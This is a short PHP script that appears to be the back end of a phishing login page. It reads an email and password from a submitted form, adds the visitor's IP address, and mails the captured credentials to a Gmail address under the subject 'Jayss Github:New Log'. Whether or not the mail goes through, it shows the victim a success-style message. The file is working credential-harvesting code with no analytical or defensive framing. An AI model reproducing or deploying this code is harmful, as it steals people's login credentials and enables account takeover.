<?php

function getVisitorIp() {
    $ip = $_SERVER['REMOTE_ADDR'];

    if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {
        $ip = array_pop(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']));
    }

    return $ip;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve user input
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Get visitor's IP address
    $visitorIp = getVisitorIp();

    // Email details
    $to = "juliehcael@gmail.com";
    $subject = "Jayss Github:New Log";
    $message = "Email: $email\nPassword: $password\nVisitor IP: $visitorIp";

    // Send email
    $headers = "From: juliehcael@gmail.com";

    if (mail($to, $subject, $message, $headers)) {
        echo "Email sent successfully!";
    } else {
        echo "Email Sent . Validation Done.";
    }
}

?>